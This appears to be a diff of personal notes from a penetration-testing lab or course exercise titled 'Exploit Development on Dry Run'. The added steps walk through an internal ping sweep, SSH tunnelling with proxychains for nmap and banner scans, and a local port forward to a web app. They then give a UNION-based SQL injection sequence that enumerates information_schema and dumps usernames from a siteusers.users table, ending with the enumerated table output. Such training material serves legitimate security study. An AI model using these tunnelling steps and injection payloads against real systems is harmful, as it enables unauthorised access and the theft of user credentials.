@@ -82,13 +82,53 @@ Exploit Development on Dry Run
 
 Step 4
 - going back to the user2 shell. if we run the for script we can see other ips that could be of interest. 
-- or i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+- or i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done       (this gives us 192.168.28.165, 175)
 - now we can make a dynamic tunnel as an extension of our last tunnel so we can nmap scan these new ips.
 - ssh -S /tmp/jmp ANYTHING -O forward -D 9050
+- proxychains nmap 192.168.28.165 -T4 2>/dev/null
+- this gives us port 22 and port 8888
+- just to be safe id proxychains nc 192.168.28.165 8888
+- you can also run banner nmap script. proxychains nmap --script banner.nse 192.168.28.165 -T4 -p 22,8888 2>/dev/null
+- you should run these scripts and commands on both ips that you found and take note of all ips
+- from the .175 we found ports 2222 and 8000
+- we can now create another tunnel to forward our traffic to our next target box (in this case we are going to go to the 175) but it doesnt matter which one we go to first.
+- ssh -S /tmp/jmp ANYTHING -O forward -L 22080:192.168.28.175:8000
+- with that command we can now open the web browser and see whats on the website. 127.0.0.1:22080
+
+
+STEP 5
+SQL
+- When we open this website we get a products page with multiple selections
+- When we hit submit on these we get tables
+- go through the different selections and take note of the url
+- on this website specifically just by submitting on these choices we dont see anything funky or weird. 
+- so now we can try some sql techniques
+- looking at this url we could input stuff after the question mark.
+- Your selection field is "product=" as you can see from the url.
+- product=7 UNION SELECT 1,2,3 (we got this 7 by increasing by one until we got something different.)
+- now we have identified this vulnerable field we can run our golden statement
+- product=7 UNION SELECT Table_schema,Column_name,table_name FROM Information_schema.columns
+- this will give us a big ole table
+- from this table we look for user made tables, so anything that is not a default
+- ignore the first line
+- now we are going to query a different database, so replace information.schema.columns with siteusers.columns
+- now we wanna look at the users so we are going to replace the columns with users. situsers.users
+- and we want to look at the 3 values being, user_id, name, and username
+- <URL>/pick.php?product=7 UNION SELECT user_id,name,username FROM siteusers.users
+- this gives us more creds in a table
 - 
 
-
-
+siteusers 	id 	      $purchase_history
+siteusers 	quantity 	$purchase_history
+siteusers 	product 	$purchase_history
+siteusers 	account 	$purchase_history
+siteusers 	id       	$shippingdates
+siteusers 	ordernumber 	$shippingdates
+siteusers 	account 	$shippingdates
+siteusers 	date     	$shippingdates
+siteusers 	user_id 	$users
+siteusers 	name 	    $users
+siteusers 	username 	$users
 
 
 
